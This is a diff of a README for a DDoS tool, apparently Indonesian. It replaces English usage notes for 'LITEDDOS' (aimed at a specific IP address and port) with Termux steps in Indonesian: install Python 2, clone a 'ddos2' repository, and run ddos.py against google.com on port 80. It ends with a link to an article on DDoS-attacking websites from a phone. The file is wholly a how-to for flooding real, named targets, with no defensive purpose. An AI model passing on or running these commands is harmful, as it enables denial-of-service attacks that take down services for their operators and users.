@@ -1,2 +1,15 @@
-# LITEDDOS
-This Tool Is Supporting For DDOS Activities, The Way Is Typing Command :  $ python2 islddos.py &lt;ip> &lt;port> &lt;packet>   example:  $python2 islddos.py 104.27.190.77 8080 100  IP target: 104.27.190.77 port: 8080 packet:100  Made In indonesia Indonesia Security Lite
+Menggunakan DDOS dengan termux bye Kumpulan Remaja
+
+kode perintah 
+
+pkg update && pkg upgrade
+pkg git 
+pkg python2
+git clone
+git clone https://github.com/kumpulanremaja/ddos2 
+cd ddos2
+python2 ddos.py -s google.com -p 80 -t 135 
+
+supaya lebih jelas bisa baca artikel Cara DDOS Attack Website dengan Termux di Android dengan link di bawah ini
+
+https://www.kumpulanremaja.com/2019/08/cara-ddos-attack-website-dengan-termux.html
